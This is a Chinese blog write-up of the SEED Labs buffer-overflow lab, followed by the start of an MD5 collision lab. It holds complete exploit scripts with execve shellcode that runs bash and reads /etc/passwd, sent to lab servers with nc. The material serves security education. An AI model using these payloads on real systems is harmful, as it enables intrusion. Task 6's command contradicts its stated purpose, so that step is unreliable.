class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ echo hello | nc 10.9.0.6 9090</span><br><span class="line">^C</span><br><span class="line">server<span class="string">-2</span><span class="string">-10</span>.9.0.6 | Got a connection from 10.9.0.1</span><br><span class="line">server<span class="string">-2</span><span class="string">-10</span>.9.0.6 | Starting stack</span><br><span class="line">server<span class="string">-2</span><span class="string">-10</span>.9.0.6 | Input size: 6</span><br><span class="line">server<span class="string">-2</span><span class="string">-10</span>.9.0.6 | Buffer&#x27;s address inside bof():     0xffffd028</span><br><span class="line">server<span class="string">-2</span><span class="string">-10</span>.9.0.6 | ==== Returned Properly ====</span><br></pre></td></tr></table></figure><p>修改 <code>exploit.py</code></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="built_in">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can use this shellcode to run any command you want</span></span><br><span class="line">s<span class="attr">hellcode</span> <span class="operator">=</span> (</span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>eb<span class="char escape_">\x</span>29<span class="char escape_">\x</span>5b<span class="char escape_">\x</span>31<span class="char escape_">\x</span>c0<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>09<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>0c<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>47<span class="char escape_">\x</span>89<span class="char escape_">\x</span>5b&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>48<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>0a<span class="char escape_">\x</span>89<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>4c<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>0d<span class="char escape_">\x</span>89<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>50<span class="char escape_">\x</span>89<span class="char escape_">\x</span>43<span class="char escape_">\x</span>54&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>48<span class="char escape_">\x</span>31<span class="char escape_">\x</span>d2<span class="char escape_">\x</span>31<span class="char escape_">\x</span>c0<span class="char escape_">\x</span>b0<span class="char escape_">\x</span>0b<span class="char escape_">\x</span>cd<span class="char escape_">\x</span>80<span class="char escape_">\x</span>e8<span class="char escape_">\x</span>d2<span class="char escape_">\x</span>ff<span class="char escape_">\x</span>ff<span class="char escape_">\x</span>ff&quot;</span></span><br><span class="line">    <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">    <span class="string">&quot;-c*&quot;</span></span><br><span class="line">    <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">    <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">    <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">    <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">    <span class="comment"># so the command string ends here.</span></span><br><span class="line">    <span class="comment"># You can delete/add spaces, if needed, to keep the position the same.</span></span><br><span class="line">    <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">    <span class="string">&quot;/bin/ls -l; echo Hello 32; /bin/tail -n 4 /etc/passwd     *&quot;</span></span><br><span class="line">    <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] -- &gt; &quot;/bin/bash&quot;</span></span><br><span class="line">    <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] -- &gt; &quot;-c&quot;</span></span><br><span class="line">    <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] -- &gt; the command string</span></span><br><span class="line">    <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] -- &gt; NULL</span></span><br><span class="line">).encode(&#x27;latin-<span class="number">1</span>&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">c<span class="attr">ontent</span> <span class="operator">=</span> bytearray(<span class="number">0</span>x90 for i <span class="keyword">in</span> range(<span class="number">517</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">s<span class="attr">tart</span> <span class="operator">=</span> <span class="number">517</span> <span class="operator">-</span> len(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start <span class="operator">+</span> len(shellcode)] <span class="operator">=</span> shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value</span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">r<span class="attr">et</span>    <span class="operator">=</span> <span class="number">0</span>xffffd218 <span class="operator">+</span> <span class="number">308</span>   <span class="comment"># Change this number</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">for offset <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">304</span>,<span class="number">4</span>):</span><br><span class="line">    content[offset:offset <span class="operator">+</span> <span class="number">4</span>] <span class="operator">=</span> (ret).to_bytes(<span class="number">4</span>,byteorder<span class="operator">=</span>&#x27;little&#x27;)</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> open(&#x27;badfile&#x27;, &#x27;wb&#x27;) as <span class="params">f:</span></span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure><p>其中，</p><ul><li><code>ret</code> 应当大于等于 <code>0xffffd218</code>(+308)，但应当保证 shellcode 都在 <code>payload</code> 内</li><li><code>offset</code> 为 100-300 之间的某个值</li></ul><p>然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./exploit.py</span><br><span class="line"><span class="built_in">cat</span> badfile | nc 10.9.0.6 9090</span><br></pre></td></tr></table></figure><p>得到了结果</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260106000941041.png" alt="image-20260105232958194"></p><h2 id="Task-4-Level-3-Attack">Task 4: Level-3 Attack</h2><p>本 task 重点在于处理 64 位地址的 buffer。实验手册这样描述本实验遇到的问题：</p><blockquote><p>Compared to buffer-overflow attacks on 32-bit machines, attacks on 64-bit machines is more difficult. The most difficult part is the address. Although the x64 architecture supports 64-bit address space, only the address from <code>0x00</code> through <code>0x00007FFFFFFFFFFF</code> is allowed. That means for every address (8 bytes), the highest two bytes are always zeros. This causes a problem. In our buffer-overflow attacks, we need to store at least one address in the payload, and the payload will be copied into the stack via <code>strcpy()</code>. We know that the <code>strcpy()</code> function will stop copying when it sees a zero. Therefore, if a zero appears in the middle of the payload, the content after the zero cannot be copied into the stack. How to solve this problem is the most difficult challenge in this attack.</p></blockquote><p>解决方法是 ret 采用 little endian，复用地址中的 <code>\0x00\0x00</code>。</p><p>同样的，我们先 <code>echo hello</code></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ echo hello | nc 10.9.0.7 9090</span><br><span class="line">^C</span><br><span class="line">server<span class="string">-3</span><span class="string">-10</span>.9.0.7 | Got a connection from 10.9.0.1</span><br><span class="line">server<span class="string">-3</span><span class="string">-10</span>.9.0.7 | Starting stack</span><br><span class="line">server<span class="string">-3</span><span class="string">-10</span>.9.0.7 | Input size: 6</span><br><span class="line">server<span class="string">-3</span><span class="string">-10</span>.9.0.7 | Frame Pointer (rbp) inside bof():  0x00007fffffffe210</span><br><span class="line">server<span class="string">-3</span><span class="string">-10</span>.9.0.7 | Buffer&#x27;s address inside bof():     0x00007fffffffe140</span><br><span class="line">server<span class="string">-3</span><span class="string">-10</span>.9.0.7 | ==== Returned Properly ====</span><br></pre></td></tr></table></figure><p>修改 <code>exploit.py</code></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="built_in">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can use this shellcode to run any command you want</span></span><br><span class="line">s<span class="attr">hellcode</span> <span class="operator">=</span> (</span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>eb<span class="char escape_">\x</span>36<span class="char escape_">\x</span>5b<span class="char escape_">\x</span>48<span class="char escape_">\x</span>31<span class="char escape_">\x</span>c0<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>09<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>0c<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>47<span class="char escape_">\x</span>48&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>89<span class="char escape_">\x</span>5b<span class="char escape_">\x</span>48<span class="char escape_">\x</span>48<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>0a<span class="char escape_">\x</span>48<span class="char escape_">\x</span>89<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>50<span class="char escape_">\x</span>48<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>0d<span class="char escape_">\x</span>48&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>89<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>58<span class="char escape_">\x</span>48<span class="char escape_">\x</span>89<span class="char escape_">\x</span>43<span class="char escape_">\x</span>60<span class="char escape_">\x</span>48<span class="char escape_">\x</span>89<span class="char escape_">\x</span>df<span class="char escape_">\x</span>48<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>73<span class="char escape_">\x</span>48<span class="char escape_">\x</span>48<span class="char escape_">\x</span>31&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>d2<span class="char escape_">\x</span>48<span class="char escape_">\x</span>31<span class="char escape_">\x</span>c0<span class="char escape_">\x</span>b0<span class="char escape_">\x</span>3b<span class="char escape_">\x</span>0f<span class="char escape_">\x</span>05<span class="char escape_">\x</span>e8<span class="char escape_">\x</span>c5<span class="char escape_">\x</span>ff<span class="char escape_">\x</span>ff<span class="char escape_">\x</span>ff&quot;</span></span><br><span class="line">    <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">    <span class="string">&quot;-c*&quot;</span></span><br><span class="line">    <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">    <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">    <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">    <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">    <span class="comment"># so the command string ends here.</span></span><br><span class="line">    <span class="comment"># You can delete/add spaces, if needed, to keep the position the same.</span></span><br><span class="line">    <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">    <span class="string">&quot;/bin/ls -l; echo Hello 64; /bin/tail -n 4 /etc/passwd     *&quot;</span></span><br><span class="line">    <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] -- &gt; &quot;/bin/bash&quot;</span></span><br><span class="line">    <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] -- &gt; &quot;-c&quot;</span></span><br><span class="line">    <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] -- &gt; the command string</span></span><br><span class="line">    <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] -- &gt; NULL</span></span><br><span class="line">).encode(&#x27;latin-<span class="number">1</span>&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">c<span class="attr">ontent</span> <span class="operator">=</span> bytearray(<span class="number">0</span>x90 for i <span class="keyword">in</span> range(<span class="number">517</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">s<span class="attr">tart</span> <span class="operator">=</span> <span class="number">0</span>               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start <span class="operator">+</span> len(shellcode)] <span class="operator">=</span> shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value</span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">r<span class="attr">et</span>    <span class="operator">=</span> <span class="number">0</span>x00007fffffffe140 <span class="comment"># Change this number</span></span><br><span class="line">o<span class="attr">ffset</span> <span class="operator">=</span> <span class="number">216</span>                <span class="comment"># Change this number</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset <span class="operator">+</span> <span class="number">8</span>] <span class="operator">=</span> (ret).to_bytes(<span class="number">8</span>,byteorder<span class="operator">=</span>&#x27;little&#x27;)</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> open(&#x27;badfile&#x27;, &#x27;wb&#x27;) as <span class="params">f:</span></span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure><p>其中，</p><ul><li>shellcode 即为 <code>shellcode_64.py</code> 中的 shellcode</li><li>start 设定为一个较小的值，可以直接取 (0)</li><li>ret 设定为 buffer 的地址</li><li>(\text{offset}=)<code>0x00007fffffffe610</code>(-)<code>0x00007fffffffe540</code>(+8)</li></ul><p>然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./exploit.py</span><br><span class="line"><span class="built_in">cat</span> badfile | nc 10.9.0.7 9090</span><br></pre></td></tr></table></figure><p>得到了结果</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260106000941086.png" alt="image-20260105233343319"></p><h2 id="Task-5-Level-4-Attack">Task 5: Level-4 Attack</h2><p>本 task 重点在于执行 return-to-libc 攻击。</p><p>同样的，我们先 <code>echo hello</code></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ echo hello | nc 10.9.0.8 9090</span><br><span class="line">^C</span><br><span class="line">server<span class="string">-4</span><span class="string">-10</span>.9.0.8 | Got a connection from 10.9.0.1</span><br><span class="line">server<span class="string">-4</span><span class="string">-10</span>.9.0.8 | Starting stack</span><br><span class="line">server<span class="string">-4</span><span class="string">-10</span>.9.0.8 | Input size: 6</span><br><span class="line">server<span class="string">-4</span><span class="string">-10</span>.9.0.8 | Frame Pointer (rbp) inside bof():  0x00007fffffffe210</span><br><span class="line">server<span class="string">-4</span><span class="string">-10</span>.9.0.8 | Buffer&#x27;s address inside bof():     0x00007fffffffe1b0</span><br><span class="line">server<span class="string">-4</span><span class="string">-10</span>.9.0.8 | ==== Returned Properly ====</span><br></pre></td></tr></table></figure><p>修改 <code>exploit.py</code></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="built_in">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can use this shellcode to run any command you want</span></span><br><span class="line">s<span class="attr">hellcode</span> <span class="operator">=</span> (</span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>eb<span class="char escape_">\x</span>36<span class="char escape_">\x</span>5b<span class="char escape_">\x</span>48<span class="char escape_">\x</span>31<span class="char escape_">\x</span>c0<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>09<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>0c<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>47<span class="char escape_">\x</span>48&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>89<span class="char escape_">\x</span>5b<span class="char escape_">\x</span>48<span class="char escape_">\x</span>48<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>0a<span class="char escape_">\x</span>48<span class="char escape_">\x</span>89<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>50<span class="char escape_">\x</span>48<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>0d<span class="char escape_">\x</span>48&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>89<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>58<span class="char escape_">\x</span>48<span class="char escape_">\x</span>89<span class="char escape_">\x</span>43<span class="char escape_">\x</span>60<span class="char escape_">\x</span>48<span class="char escape_">\x</span>89<span class="char escape_">\x</span>df<span class="char escape_">\x</span>48<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>73<span class="char escape_">\x</span>48<span class="char escape_">\x</span>48<span class="char escape_">\x</span>31&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>d2<span class="char escape_">\x</span>48<span class="char escape_">\x</span>31<span class="char escape_">\x</span>c0<span class="char escape_">\x</span>b0<span class="char escape_">\x</span>3b<span class="char escape_">\x</span>0f<span class="char escape_">\x</span>05<span class="char escape_">\x</span>e8<span class="char escape_">\x</span>c5<span class="char escape_">\x</span>ff<span class="char escape_">\x</span>ff<span class="char escape_">\x</span>ff&quot;</span></span><br><span class="line">    <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">    <span class="string">&quot;-c*&quot;</span></span><br><span class="line">    <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">    <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">    <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">    <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">    <span class="comment"># so the command string ends here.</span></span><br><span class="line">    <span class="comment"># You can delete/add spaces, if needed, to keep the position the same.</span></span><br><span class="line">    <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">    <span class="string">&quot;/bin/ls -l; echo Hello 64; /bin/tail -n 4 /etc/passwd     *&quot;</span></span><br><span class="line">    <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] -- &gt; &quot;/bin/bash&quot;</span></span><br><span class="line">    <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] -- &gt; &quot;-c&quot;</span></span><br><span class="line">    <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] -- &gt; the command string</span></span><br><span class="line">    <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] -- &gt; NULL</span></span><br><span class="line">).encode(&#x27;latin-<span class="number">1</span>&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">c<span class="attr">ontent</span> <span class="operator">=</span> bytearray(<span class="number">0</span>x90 for i <span class="keyword">in</span> range(<span class="number">517</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">s<span class="attr">tart</span> <span class="operator">=</span> <span class="number">51</span>7-len(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start <span class="operator">+</span> len(shellcode)] <span class="operator">=</span> shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value</span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">r<span class="attr">et</span>    <span class="operator">=</span> <span class="number">0</span>x00007fffffffe040<span class="operator">+</span><span class="number">1200</span>   <span class="comment"># Change this number</span></span><br><span class="line">o<span class="attr">ffset</span> <span class="operator">=</span> <span class="number">104</span>                       <span class="comment"># Change this number</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset <span class="operator">+</span> <span class="number">8</span>] <span class="operator">=</span> (ret).to_bytes(<span class="number">8</span>,byteorder<span class="operator">=</span>&#x27;little&#x27;)</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> open(&#x27;badfile&#x27;, &#x27;wb&#x27;) as <span class="params">f:</span></span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure><p>其中，</p><ul><li>将shellcode放在高位。</li><li>offset=rbp-buffer+8；</li><li>ret：取一个较大值，在 1184到 1424之间。由于\x00截断了strcpy函数，因此需要触发的shellcode并没有被拷贝到缓冲区，因此ret指向的位置需是主函数中str数组中shellcode的位置。<ul><li>调试L4级别的stack.c，可以获取到str数组的地址，我们需要跳转到str数组中的ret和shellcode中间的NOP中。</li><li><code>str的地址+offset+8-rbp=1184</code>；</li><li><code>str的地址+517-165-rbp=1424</code>；shellcode是165个字节。</li></ul></li></ul><p>生成badfile上传，nc连接。</p><p>然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./exploit.py</span><br><span class="line"><span class="built_in">cat</span> badfile | nc 10.9.0.8 9090</span><br></pre></td></tr></table></figure><p>得到了结果</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260106000941132.png" alt="image-20260106000531238"></p><h2 id="Task-6-Experimenting-with-the-Address-Randomization">Task 6: Experimenting with the Address Randomization</h2><p>关闭地址随机化：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /sbin/sysctl -w kernel.randomize_va_space=2</span><br></pre></td></tr></table></figure><p>向容器多次发送消息可以看到每次得到的地址都在变化。因此使用爆破的办法，选定一个作为返回地址，一旦命中就停止。自动化sh脚本在实验环境中有。</p><h2 id="Tasks-7-Experimenting-with-Other-Countermeasures">Tasks 7: Experimenting with Other Countermeasures</h2><h3 id="7-1栈溢出保护">7.1栈溢出保护</h3><p>修改stack.c，使badfile作为fread的输入：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="keyword">file</span>=fopen(<span class="string">&quot;badfile&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="built_in">int</span> length = fread(str, <span class="keyword">sizeof</span>(<span class="built_in">char</span>), <span class="number">517</span>, <span class="keyword">file</span>);</span><br></pre></td></tr></table></figure><p>编译stack.c时不使用<code>-fno-stack-protector</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -DBUF_SIZE=<span class="number">80</span> -o stack -z execstack stack.c</span><br></pre></td></tr></table></figure><p>可以看到错误提示：stack smashing</p><h3 id="7-2栈不可执行">7.2栈不可执行</h3><p>编译call_shellcode.c时不使用<code>-z execstack</code></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o <span class="built_in">a32</span><span class="number">.</span><span class="keyword">out</span> call_shellcode<span class="number">.</span>c</span><br></pre></td></tr></table></figure><p>运行a32.out可以看到segmentation fault</p><h2 id="实验总结">实验总结</h2><p>实验总体难度不大，只要把握住 buffer overflow 的原理，便可以很容易解决各种问题。Task2 为本实验的基础；Task3 做了一点微小的改动；Task4 难度较大，因为 64 位地址的最高两位永远是 (00)，导致 <code>strcpy</code> 会提前终止，需要思考如何处理这一问题；Task5 理解原理后比较容易；Task6 和 Task7 依葫芦画瓢即可，没有难度。</p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seed-Labs </tag>
            
            <tag> Shellcode </tag>
            
            <tag> System-Security </tag>
            
            <tag> Buffer-Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Seed-Labs 2.0】MD5 Collision</title>
      <link href="/posts/b8f6a2c7.html"/>
      <url>/posts/b8f6a2c7.html</url>
      
        <content type="html"><![CDATA[<h1>【Seed-Labs 2.0】MD5 Collision</h1><p>本文是实验的复现，原文地址：<a href="https://blog.ch3nyang.top/post/seedlab_MD5/">Ch3nyang’s blog | SEEDLabs (6) -MD5 Collision</a></p><p>本文为 <a href="https://seedsecuritylabs.org/Labs_20.04/Crypto/Crypto_MD5_Collision/">SEED Labs 2.0 - MD5 Collision Attack Lab</a> 的实验记录。</p><h2 id="实验原理">实验原理</h2><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105210617347.png" alt="image-20260105210119359"></p><p>四个函数每个作用 16 轮，得到最后的结果。</p><h2 id="Task-1-Generating-Two-Different-Files-with-the-Same-MD5-Hash">Task 1: Generating Two Different Files with the Same MD5 Hash</h2><p>首先创建 <code>prefix.txt</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch <span class="keyword">prefix</span>.txt</span><br><span class="line">vim <span class="keyword">prefix</span>.txt</span><br></pre></td></tr></table></figure><p>例如，我们修改内容为</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hail hydra</span></span><br></pre></td></tr></table></figure><p>然后生成两个 md5 相同的文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5collgen -<span class="selector-tag">p</span> prefix<span class="selector-class">.txt</span> -o out1<span class="selector-class">.bin</span> out2.bin</span><br></pre></td></tr></table></figure><p>验证我们的文件是否相同、md5是否相同</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260105210617398.png" alt="image-20260105204005211"></p><p>我们分别查看 <code>out1.bin</code> 和 <code>out2.bin</code></p><p><img 